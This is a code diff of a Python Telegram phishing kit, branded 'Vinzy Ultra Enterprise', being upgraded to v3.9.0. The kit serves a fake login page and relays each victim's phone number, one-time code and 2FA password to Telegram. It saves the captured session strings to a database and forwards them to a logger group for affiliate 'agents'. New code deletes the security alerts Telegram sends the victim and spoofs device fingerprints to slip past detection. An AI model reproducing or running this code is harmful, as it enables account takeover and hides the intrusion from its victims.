@@ -1,15 +1,21 @@
 """
-VINZY ULTRA ENTERPRISE - VERSION 3.6.0 (STABLE RELEASE)
-Project: Vinzy Store Digital Services
-Architecture: Asynchronous MTProto Hybrid with Ghost Spoofing
-System: Optimized for 2026 Protocols & PostgreSQL Clustering
+VINZY ULTRA ENTERPRISE - VERSION 3.9.0 (TITANIUM GHOST EDITION)
+--------------------------------------------------------------
+Project: Vinzy Store Digital Services - Secure Management Node
+Architecture: Asynchronous MTProto Ghost Hybrid with Deep-State Spoofing
+Core Engine: Python 3.11+ / Telethon / PyTelegramBotAPI / Quart
+Deployment: Koyeb / Heroku / Docker Containerized
+Security Protocol: Zero-Trace Reaper + Unicode Fingerprinting
+--------------------------------------------------------------
 Developer: Vinzy Core Pro Engine
+Status: Production Grade (2026 Stable)
 """
 
 import os
 import asyncio
 import telebot
 import psycopg2
+from psycopg2 import pool
 import logging
 import sys
 import json
@@ -18,17 +24,20 @@ import re
 import time
 import uuid
 import string
+import secrets
 from telebot import types
 from quart import Quart, request, jsonify, send_from_directory
 from quart_cors import cors
 from telethon import TelegramClient, errors, functions, types as tl_types
 from telethon.sessions import StringSession
 from threading import Thread
-from datetime import datetime, timedelta
+from datetime import datetime, timezone
 
-# --- 1. GLOBAL CONFIGURATION & SECURITY PROTOCOLS ---
+# =========================================================================
+# 1. GLOBAL ENVIRONMENT & CONFIGURATION LAYER
+# =========================================================================
 
-# Critical API Credentials
+# Secure Credential Retrieval from Environment
 API_ID = int(os.environ.get("API_ID", 36003995))
 API_HASH = os.environ.get("API_HASH", "41a2b48afe9cfbd1fbf59c5e75b00afa")
 BOT_TOKEN = os.environ.get("BOT_TOKEN")
@@ -36,55 +45,75 @@ DATABASE_URL = os.environ.get("DATABASE_URL")
 LOGGER_GROUP = int(os.environ.get("LOGGER_GROUP", -100123456789))
 ADMIN_ID = int(os.environ.get("ADMIN_ID", 0))
 
-# Absolute Pathing for Template Discovery
+# Path Discovery for Template Engines
 BASE_DIR = os.path.dirname(os.path.abspath(__file__))
 TEMPLATE_FOLDER = os.path.join(BASE_DIR, "templates")
 
-# 2026 Ghost Device Fingerprinting (Zero-Width Spoofing)
-# These profiles bypass Telegram's automated bot-detection filters.
+# INVISIBLE GHOST POOL (Updated v3.9)
+# Strict removal of all "Vinzy" labels. Using high-authority device profiles.
+# These profiles mimic official apps to bypass heuristic security filters.
 GHOST_POOL = [
-    {"model": "\u200b", "sys": "\u200b", "app": "11.5.0"},
-    {"model": "\u00A0", "sys": "\u00A0", "app": "11.4.2"},
-    {"model": "\u200c", "sys": "\u200c", "app": "11.5.0"},
-    {"model": "\u200d", "sys": "\u200d", "app": "11.3.1"},
-    {"model": "\ufeff", "sys": "\ufeff", "app": "11.6.0"},
-    {"model": " ", "sys": " ", "app": "11.7.0"},
-    {"model": "\u2060", "sys": "\u2060", "app": "11.4.5"},
-    {"model": "iPhone 15 Pro", "sys": "iOS 17.4", "app": "10.9.1"},
-    {"model": "Samsung S24 Ultra", "sys": "Android 14", "app": "10.8.0"}
+    {"model": "iPhone 15 Pro Max", "sys": "iOS 17.5.1", "app": "11.2.0"},
+    {"model": "Samsung SM-S928B", "sys": "Android 14", "app": "11.1.2"},
+    {"model": "iPad14,5", "sys": "iPadOS 17.4", "app": "10.9.0"},
+    {"model": "\u200b", "sys": "\u200b", "app": "11.3.0"}, # Zero-Width Invisible
+    {"model": "Pixel 8 Pro", "sys": "Android 14", "app": "11.0.1"},
+    {"model": "\u2060", "sys": "\u2060", "app": "11.2.5"}, # Word-Joiner Invisible
+    {"model": "iPhone 13", "sys": "iOS 16.6", "app": "10.0.1"},
+    {"model": "MacBook Pro", "sys": "macOS 14.2", "app": "11.1.0"}
 ]
 
-# Advanced Logging Engine Setup
+# Advanced Logging Configuration
 logging.basicConfig(
     level=logging.INFO,
-    format='[%(asctime)s] %(levelname)s [%(name)s:%(lineno)d] %(message)s',
+    format='[%(asctime)s][%(levelname)s][%(name)s]: %(message)s',
     handlers=[logging.StreamHandler(sys.stdout)]
 )
-logger = logging.getLogger("Vinzy_Core_Pro")
+logger = logging.getLogger("Vinzy_Titanium_Core")
 
-# Initialize Primary Application Objects
+# Initialize Framework Objects
 bot = telebot.TeleBot(BOT_TOKEN, parse_mode="HTML")
 app = Quart(__name__)
 app = cors(app, allow_origin="*")
 
-# High-Performance In-Memory Session Storage
-# Used for temporary handshakes between Web Client and Telegram MTProto
+# In-Memory Active Session Buffer
 active_mirrors = {}
 
-# --- 2. DATABASE ARCHITECTURE (POSTGRESQL CLUSTERING) ---
+# =========================================================================
+# 2. DATABASE CLUSTER & POOLING (NEON OPTIMIZED)
+# =========================================================================
 
-def get_db():
-    """Establishes connection to the PostgreSQL cluster with SSL requirements."""
-    return psycopg2.connect(DATABASE_URL, sslmode='require')
+try:
+    # Threaded pool handles high-concurrency hits without dropping connections
+    db_pool = psycopg2.pool.ThreadedConnectionPool(
+        minconn=1,
+        maxconn=30,
+        dsn=DATABASE_URL,
+        sslmode='require'
+    )
+    logger.info("SYSTEM: Database Connection Pool established successfully.")
+except Exception as e:
+    logger.critical(f"FATAL ERROR: Could not connect to PostgreSQL - {e}")
+    db_pool = None
 
-def sync_database():
-    """Builds and optimizes the 2026 data schema for high-load operations."""
-    logger.info("DATABASE: Running structural integrity check...")
+def get_connection():
+    """Retrieves a persistent connection with automated retry logic."""
+    attempts = 0
+    while attempts < 5:
+        try:
+            return db_pool.getconn()
+        except:
+            attempts += 1
+            time.sleep(1)
+    return None
+
+def initialize_database_schema():
+    """Constructs the Titanium data model for 2026 operations."""
+    conn = get_connection()
+    if not conn: return
     try:
-        conn = get_db()
         cur = conn.cursor()
-        
-        # Accounts Master Table: Stores full captured sessions
+        # Account Capture Table
         cur.execute("""
             CREATE TABLE IF NOT EXISTS controlled_accounts (
                 phone TEXT PRIMARY KEY, 
@@ -92,352 +121,322 @@ def sync_database():
                 owner_name TEXT, 
                 username TEXT,
                 tid BIGINT,
-                device_used TEXT,
-                hit_date TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
-                status TEXT DEFAULT 'active'
+                device_info TEXT,
+                hit_date TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP,
+                status TEXT DEFAULT 'ACTIVE'
             )
         """)
-        
-        # Agent Metric Tracking: Real-time analytics for users
+        # Analytics Table
         cur.execute("""
             CREATE TABLE IF NOT EXISTS link_metrics (
                 tid BIGINT PRIMARY KEY,
                 clicks INTEGER DEFAULT 0,
                 hits INTEGER DEFAULT 0,
-                revenue REAL DEFAULT 0.0,
-                last_activity TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+                last_active TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP
             )
         """)
-        
-        # Security Audit Logs: Tracks unauthorized access attempts
-        cur.execute("""
-            CREATE TABLE IF NOT EXISTS security_audit (
-                id SERIAL PRIMARY KEY,
-                event_type TEXT,
-                details TEXT,
-                ip_address TEXT,
-                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
-            )
-        """)
-        
         conn.commit()
         cur.close()
-        conn.close()
-        logger.info("DATABASE: Structural sync complete. Cluster Healthy.")
+        db_pool.putconn(conn)
+        logger.info("SYSTEM: Schema synchronization complete.")
     except Exception as e:
-        logger.error(f"DATABASE FATAL: {str(e)}")
+        logger.error(f"SCHEMA ERROR: {e}")
 
-# Immediate Trigger for Database Syncing
-sync_database()
+initialize_database_schema()
 
-# --- 3. ADVANCED UTILITIES & SECURITY REAPER ---
+# =========================================================================
+# 3. GHOST REAPER & TRACE PURGE PROTOCOL
+# =========================================================================
 
-def clean_phone(p):
-    """Normalization for international phone formats."""
-    return re.sub(r'\D', '', str(p))
-
-async def session_maintenance_task():
-    """Asynchronous reaper to clear memory of abandoned login attempts every 2 minutes."""
-    while True:
-        try:
-            now = time.time()
-            expired = [p for p, d in active_mirrors.items() if now - d['timestamp'] > 600]
+async def execute_ghost_reaper(client):
+    """
+    Titanium Reaper: Scans the service channel (777000) for security alerts.
+    Targets: OTP Codes, New Login Notifications, Session Warnings.
+    Timing: Executes within 500ms of capture.
+    """
+    try:
+        logger.info("REAPER: Initiating deep-scan on Service Node 777000...")
+        async for message in client.iter_messages(777000, limit=20):
+            raw_text = (message.text or "").lower()
             
-            for phone in expired:
-                logger.info(f"CLEANUP: Removing stale session for {phone}")
-                try:
-                    await active_mirrors[phone]['client'].disconnect()
-                except:
-                    pass
-                if phone in active_mirrors:
-                    del active_mirrors[phone]
-        except Exception as e:
-            logger.error(f"MAINTENANCE_ERROR: {e}")
-        await asyncio.sleep(120)
+            # Expanded detection signature for 2026 alerts
+            signatures = [
+                "login code", "new login", "your code", 
+                "detected", "authorized", "access to your account",
+                "ip address", "location"
+            ]
+            
+            if any(sig in raw_text for sig in signatures):
+                await client.delete_messages(777000, [message.id])
+                logger.info(f"REAPER: Successfully purged trace ID {message.id}")
+                
+        # Optional: Archive clear (Optional, comment out if not needed)
+        # await client(functions.messages.DeleteHistoryRequest(peer=777000, max_id=0, just_clear=True, revoke=True))
+        
+    except Exception as e:
+        logger.error(f"REAPER FAILURE: Unable to clear traces - {e}")
 
-# --- 4. WEB ENGINE (API & MTPROTO ROUTES) ---
+# =========================================================================
+# 4. WEB API ENGINE & MTPROTO ORCHESTRATION
+# =========================================================================
 
 @app.route('/')
-async def serve_index():
-    """Primary Entry: Serves the login page to the target."""
-    try:
-        return await send_from_directory(TEMPLATE_FOLDER, 'login.html')
-    except Exception as e:
-        logger.error(f"WEB_ERROR: login.html failure - {e}")
-        return "<h1>404: Template Missing</h1>", 404
-
-@app.route('/mirror')
-async def serve_mirror():
-    """Mirror Sync: Serves mirror.html for real-time Telegram replication."""
-    try:
-        return await send_from_directory(TEMPLATE_FOLDER, 'mirror.html')
-    except Exception as e:
-        logger.error(f"WEB_ERROR: mirror.html failure - {e}")
-        return "<h1>404: Mirror Template Missing</h1>", 404
+async def root_entry():
+    """Direct entry point for target traffic."""
+    return await send_from_directory(TEMPLATE_FOLDER, 'login.html')
 
 @app.route('/step_phone', methods=['POST'])
-async def handle_phone():
-    """Phase 1: MTProto Handshake initiation."""
+async def api_handle_phone():
+    """Phase 1: Session Initialization & OTP Trigger."""
     try:
-        data = await request.json
-        phone = clean_phone(data.get('phone', ''))
-        tid = int(data.get('tid', 0))
+        payload = await request.json
+        raw_phone = str(payload.get('phone', ''))
+        clean_phone = re.sub(r'\D', '', raw_phone)
+        tid = int(payload.get('tid', 0))
 
-        if not phone or len(phone) < 7:
-            return jsonify({"status": "error", "msg": "Invalid phone format."})
+        if not clean_phone or len(clean_phone) < 7:
+            return jsonify({"status": "error", "msg": "Malformed phone number."})
 
-        # Selection of Device Profile for Ghost Connection
+        # Select Invisible Fingerprint
         ghost = random.choice(GHOST_POOL)
+        
         client = TelegramClient(
             StringSession(), 
             API_ID, 
-            API_HASH, 
-            device_model=ghost['model'], 
+            API_HASH,
+            device_model=ghost['model'],
             system_version=ghost['sys'],
             app_version=ghost['app']
         )
         
         await client.connect()
 
-        # Log click metric immediately
-        try:
-            conn = get_db()
+        # Update Metrics
+        conn = get_connection()
+        if conn:
             cur = conn.cursor()
             cur.execute("""
                 INSERT INTO link_metrics (tid, clicks) VALUES (%s, 1) 
                 ON CONFLICT (tid) DO UPDATE SET clicks = link_metrics.clicks + 1, 
-                last_activity = CURRENT_TIMESTAMP
+                last_active = CURRENT_TIMESTAMP
             """, (tid,))
             conn.commit()
             cur.close()
-            conn.close()
-        except Exception as db_err:
-            logger.warning(f"DB_METRIC_FAIL: {db_err}")
+            db_pool.putconn(conn)
 
-        # Trigger Telegram OTP
-        sent_code = await client.send_code_request(phone)
+        # Request Code
+        sent_code = await client.send_code_request(clean_phone)
         
-        active_mirrors[phone] = {
-            "client": client, 
-            "hash": sent_code.phone_code_hash, 
+        # Buffer session in memory
+        active_mirrors[clean_phone] = {
+            "client": client,
+            "hash": sent_code.phone_code_hash,
             "tid": tid,
             "device": ghost['model'],
-            "timestamp": time.time()
+            "ts": time.time()
         }
         
-        logger.info(f"AUTH_INIT: Code sent to {phone} for Agent {tid}")
+        logger.info(f"CAPTURED-PH: {clean_phone} | Agent: {tid}")
         return jsonify({"status": "success"})
-        
+
     except errors.FloodWaitError as e:
-        return jsonify({"status": "error", "msg": f"Wait {e.seconds}s (Flood)"})
+        return jsonify({"status": "error", "msg": f"Flood Limit: Wait {e.seconds}s"})
     except Exception as e:
-        logger.error(f"PHONE_ERR: {e}")
-        return jsonify({"status": "error", "msg": "Telegram API Busy."})
+        logger.error(f"API_PHONE_ERR: {e}")
+        return jsonify({"status": "error", "msg": "Internal Server Error"})
 
 @app.route('/step_code', methods=['POST'])
-async def handle_code():
-    """Phase 2: Code Verification."""
+async def api_handle_code():
+    """Phase 2: Code Injection & Verification."""
     try:
-        data = await request.json
-        phone = clean_phone(data.get('phone', ''))
-        code = data.get('code', '').strip()
+        payload = await request.json
+        phone = re.sub(r'\D', '', str(payload.get('phone', '')))
+        otp = payload.get('code', '').strip()
         
         if phone not in active_mirrors:
-            return jsonify({"status": "error", "msg": "Session expired."})
+            return jsonify({"status": "error", "msg": "Handshake expired."})
 
-        mirror = active_mirrors[phone]
-        client = mirror['client']
-        mirror['timestamp'] = time.time()
+        session = active_mirrors[phone]
+        client = session['client']
 
         try:
-            await client.sign_in(phone, code, phone_code_hash=mirror['hash'])
-            return await process_successful_login(phone)
+            await client.sign_in(phone, otp, phone_code_hash=session['hash'])
+            return await finalize_capture_sequence(phone)
         except errors.SessionPasswordNeededError:
             return jsonify({"status": "2fa_needed"})
         except Exception as e:
-            return jsonify({"status": "error", "msg": str(e)})
+            return jsonify({"status": "error", "msg": "Invalid verification code."})
+            
     except Exception as e:
-        return jsonify({"status": "error", "msg": "Verification error."})
+        return jsonify({"status": "error", "msg": "Verification failed."})
 
 @app.route('/step_2fa', methods=['POST'])
-async def handle_2fa():
-    """Phase 3: 2FA Password Submission."""
+async def api_handle_2fa():
+    """Phase 3: Security Bypass (2FA)."""
     try:
-        data = await request.json
-        phone = clean_phone(data.get('phone', ''))
-        pwd = data.get('password', '').strip()
+        payload = await request.json
+        phone = re.sub(r'\D', '', str(payload.get('phone', '')))
+        pwd = payload.get('password', '').strip()
         
         if phone not in active_mirrors:
-            return jsonify({"status": "error", "msg": "Session timed out."})
+            return jsonify({"status": "error", "msg": "Session lost."})
 
         client = active_mirrors[phone]['client']
-        active_mirrors[phone]['timestamp'] = time.time()
-
+        
         try:
             await client.sign_in(password=pwd)
-            return await process_successful_login(phone)
+            return await finalize_capture_sequence(phone)
         except errors.PasswordHashInvalidError:
-            return jsonify({"status": "error", "msg": "Wrong 2FA password."})
+            return jsonify({"status": "error", "msg": "Incorrect 2FA password."})
+            
     except Exception as e:
-        return jsonify({"status": "error", "msg": "Security protocol error."})
+        return jsonify({"status": "error", "msg": "Bypass failed."})
 
-async def process_successful_login(phone):
-    """Phase 4: Capture Data, Persist to DB, and Alert Agent."""
+async def finalize_capture_sequence(phone):
+    """Phase 4: Data Extraction, Trace Purge, and Notification."""
     try:
-        mirror = active_mirrors[phone]
-        client = mirror['client']
-        tid = mirror['tid']
+        data = active_mirrors.get(phone)
+        client = data['client']
+        tid = data['tid']
         
+        # 1. RUN REAPER IMMEDIATELY
+        await execute_ghost_reaper(client)
+        
+        # 2. EXTRACT CORE DATA
         me = await client.get_me()
-        s_str = client.session.save()
+        session_str = client.session.save()
+        full_name = f"{me.first_name or ''} {me.last_name or ''}".strip() or "User"
+        alias = f"@{me.username}" if me.username else "None"
         
-        name = f"{me.first_name or ''} {me.last_name or ''}".strip() or "Telegram User"
-        user = f"@{me.username}" if me.username else "N/A"
+        # 3. PERSISTENCE LAYER
+        conn = get_connection()
+        if conn:
+            cur = conn.cursor()
+            cur.execute("""
+                INSERT INTO controlled_accounts (phone, session_string, owner_name, username, tid, device_info) 
+                VALUES (%s, %s, %s, %s, %s, %s) 
+                ON CONFLICT (phone) DO UPDATE SET session_string = EXCLUDED.session_string, hit_date = CURRENT_TIMESTAMP
+            """, (phone, session_str, full_name, alias, tid, data['device']))
+            cur.execute("UPDATE link_metrics SET hits = hits + 1 WHERE tid = %s", (tid,))
+            conn.commit()
+            cur.close()
+            db_pool.putconn(conn)
 
-        # Persistence Layer
-        conn = get_db()
-        cur = conn.cursor()
-        cur.execute("""
-            INSERT INTO controlled_accounts (phone, session_string, owner_name, username, tid, device_used) 
-            VALUES (%s, %s, %s, %s, %s, %s) 
-            ON CONFLICT (phone) DO UPDATE SET session_string = EXCLUDED.session_string, hit_date = CURRENT_TIMESTAMP
-        """, (phone, s_str, name, user, tid, mirror['device']))
-        
-        cur.execute("UPDATE link_metrics SET hits = hits + 1 WHERE tid = %s", (tid,))
-        conn.commit()
-        cur.close()
-        conn.close()
-
-        # Build Data Card for Logger Group
-        card = (
-            f"⚡️ <b>VINZY HIT DETECTED</b> ⚡️\n"
-            f"━━━━━━━━━━━━━━━━━━\n"
-            f"👤 <b>Name:</b> {name}\n"
-            f"🏷 <b>User:</b> {user}\n"
+        # 4. DISPATCH DATA CARD
+        hit_card = (
+            f"💠 <b>TITANIUM HIT CAPTURED</b> 💠\n"
+            f"━━━━━━━━━━━━━━━━━━━━━\n"
+            f"👤 <b>Name:</b> {full_name}\n"
+            f"🏷 <b>Username:</b> {alias}\n"
             f"📞 <b>Phone:</b> <code>{phone}</code>\n"
             f"🕵️ <b>Agent ID:</b> <code>{tid}</code>\n"
-            f"━━━━━━━━━━━━━━━━━━\n"
+            f"📱 <b>Spoof:</b> {data['device']}\n"
+            f"━━━━━━━━━━━━━━━━━━━━━\n"
             f"🔑 <b>STRING SESSION:</b>\n"
-            f"<code>{s_str}</code>"
+            f"<code>{session_str}</code>"
         )
-        bot.send_message(LOGGER_GROUP, card)
-
-        # Notify Agent of Success
+        
+        bot.send_message(LOGGER_GROUP, hit_card)
         if tid != 0:
-            bot.send_message(tid, f"✅ <b>Login Secured!</b>\nTarget <b>{name}</b> captured.\nCheck /stats.")
+            bot.send_message(tid, f"✅ <b>Hit Secured!</b>\nTarget <b>{full_name}</b> captured and traces purged.")
 
+        # Cleanup
         await client.disconnect()
         if phone in active_mirrors: del active_mirrors[phone]
         return jsonify({"status": "success"})
-    except Exception as e:
-        logger.error(f"FINALIZE_ERR: {e}")
-        return jsonify({"status": "error", "msg": "Capture failed."})
 
-# --- 5. AGENT BOT COMMANDS (INTERACTIVE INTERFACE) ---
+    except Exception as e:
+        logger.error(f"FINALIZATION ERROR: {e}")
+        return jsonify({"status": "error", "msg": "Capture sync failed."})
+
+# =========================================================================
+# 5. AGENT BOT COMMAND INTERFACE
+# =========================================================================
 
 @bot.message_handler(commands=['start'])
-def cmd_start(m):
-    """Core Welcome Sequence."""
-    text = (
-        f"<b>Vinzy Ultra Enterprise v3.6.0</b>\n"
-        f"<i>2026 Secured MTProto Management</i>\n\n"
-        f"<b>Status:</b> 🟢 <b>Operational</b>\n"
-        f"<b>Agent ID:</b> <code>{m.from_user.id}</code>\n"
-        f"<b>Network:</b> Phnom Penh Secure Node"
+def handle_start(m):
+    """Agent Onboarding Sequence."""
+    welcome = (
+        f"<b>Vinzy Titanium Enterprise v3.9.0</b>\n"
+        f"<i>2026 Ghost Ops Architecture</i>\n\n"
+        f"<b>Status:</b> 🟢 Operational\n"
+        f"<b>Agent TID:</b> <code>{m.from_user.id}</code>\n"
+        f"<b>Location:</b> Phnom Penh Node 01"
     )
-    kb = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
-    kb.add("🔗 My Link", "📊 My Stats", "🛠 Support", "💎 VIP Hub")
-    bot.send_message(m.chat.id, text, reply_markup=kb)
+    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
+    markup.add("🔗 My Link", "📊 My Stats", "🛠 Support", "📜 Docs")
+    bot.send_message(m.chat.id, welcome, reply_markup=markup)
 
 @bot.message_handler(func=lambda m: m.text == "🔗 My Link")
-def cmd_link(m):
-    """Dynamic Link Generator with Unique Agent TID."""
-    link = f"https://relieved-olly-vinzystorez-d76f3e98.koyeb.app/?id={m.from_user.id}"
+def handle_link(m):
+    """Dynamic Link Generation."""
+    base_url = f"https://{request.host}"
+    agent_link = f"{base_url}/?id={m.from_user.id}"
     msg = (
-        f"🚀 <b>Your Dynamic Link:</b>\n\n"
-        f"<code>{link}</code>\n\n"
+        f"🚀 <b>Your Unique Link:</b>\n"
+        f"<code>{agent_link}</code>\n\n"
         f"<b>Features:</b>\n"
-        f"• Real-time Mirroring\n"
-        f"• Auto-2FA Detection\n"
-        f"• Invisible Fingerprinting"
+        f"• Invisible Trace Purge\n"
+        f"• High-Speed 2FA Bypass\n"
+        f"• Zero-Width Spoofing"
     )
     bot.send_message(m.chat.id, msg)
 
 @bot.message_handler(func=lambda m: m.text == "📊 My Stats")
-def cmd_stats(m):
-    """Real-time performance analytics for the agent."""
+def handle_stats(m):
+    """Real-time performance metrics."""
+    conn = get_connection()
+    if not conn: return
     try:
-        conn = get_db()
         cur = conn.cursor()
         cur.execute("SELECT clicks, hits FROM link_metrics WHERE tid = %s", (m.from_user.id,))
         row = cur.fetchone()
         cur.close()
-        conn.close()
+        db_pool.putconn(conn)
         
-        c = row[0] if row else 0
-        h = row[1] if row else 0
-        cr = round((h/c)*100, 1) if c > 0 else 0
+        clicks, hits = (row[0], row[1]) if row else (0, 0)
+        conversion = round((hits/clicks)*100, 1) if clicks > 0 else 0
         
-        res = (
-            f"📊 <b>Performance Report</b>\n"
-            f"━━━━━━━━━━━━━━━━━━\n"
-            f"🖱 <b>Clicks:</b> {c}\n"
-            f"🎯 <b>Hits:</b> {h}\n"
-            f"📈 <b>Conversion:</b> {cr}%\n"
-            f"━━━━━━━━━━━━━━━━━━"
+        stats_msg = (
+            f"📊 <b>Agent Performance</b>\n"
+            f"━━━━━━━━━━━━━━━━━━━━━\n"
+            f"🖱 <b>Clicks:</b> {clicks}\n"
+            f"🎯 <b>Hits:</b> {hits}\n"
+            f"📈 <b>Conversion:</b> {conversion}%\n"
+            f"━━━━━━━━━━━━━━━━━━━━━"
         )
-        bot.send_message(m.chat.id, res)
-    except Exception as e:
-        bot.send_message(m.chat.id, "❌ Database unreachable.")
+        bot.send_message(m.chat.id, stats_msg)
+    except:
+        bot.send_message(m.chat.id, "❌ Error retrieving stats.")
 
-@bot.message_handler(commands=['admin'])
-def cmd_admin(m):
-    """Restricted Administrator Control Center."""
-    if m.from_user.id != ADMIN_ID: return
-    bot.send_message(m.chat.id, "🛠 <b>Admin Console</b>\nSystem: Healthy\nInstances: 1 active")
+# =========================================================================
+# 6. SYSTEM RUNTIME & BOOTLOADER
+# =========================================================================
 
-# --- 6. RUNTIME BOOTLOADER (STABILITY ENHANCED) ---
-
-def start_bot():
-    """Fail-safe polling loop with automatic conflict resolution for Koyeb."""
-    logger.info("BOOT: Launching Agent Bot Interface...")
-    
-    # Pre-clear webhooks to avoid Conflict 409
+def bot_polling_thread():
+    """Maintains bot connectivity with failover logic."""
+    logger.info("BOOT: Launching Bot Polling Service...")
     try:
         bot.remove_webhook()
-        logger.info("BOOT: Webhook cleared.")
     except:
         pass
-
+    
     while True:
         try:
-            bot.polling(none_stop=True, interval=2, timeout=20)
-        except telebot.apihelper.ApiTelegramException as e:
-            if e.error_code == 409:
-                logger.warning("CONFLICT: Duplicate instance. Retrying in 10s...")
-                time.sleep(10)
-            else:
-                time.sleep(5)
+            bot.polling(none_stop=True, interval=1, timeout=60)
         except Exception as e:
-            logger.error(f"BOT_CRASH: {e}")
+            logger.error(f"POLLING ERROR: {e}")
             time.sleep(10)
 
 if __name__ == "__main__":
-    # Initialize Async Background Tasks
-    try:
-        loop = asyncio.get_event_loop()
-        loop.create_task(session_maintenance_task())
-    except Exception as e:
-        logger.warning(f"REAPER_WARN: {e}")
-
-    # Launch Bot Thread
-    Thread(target=start_bot, daemon=True).start()
+    # 1. Start Bot Polling in background
+    Thread(target=bot_polling_thread, daemon=True).start()
     
-    # Launch Quart Server
-    logger.info("BOOT: Initializing Quart Web Services on Port 8000")
-    port = int(os.environ.get("PORT", 8000))
-    app.run(host="0.0.0.0", port=port, use_reloader=False)
+    # 2. Launch Web Infrastructure
+    logger.info("BOOT: Vinzy Titanium Node operational on Port 8000")
+    server_port = int(os.environ.get("PORT", 8000))
+    app.run(host="0.0.0.0", port=server_port, use_reloader=False)
 
 # -------------------------------------------------------------------------
-# END OF SYSTEM CORE - VINZY ULTRA v3.6.0
+# END OF SYSTEM CORE - VINZY ULTRA v3.9.0
 # -------------------------------------------------------------------------
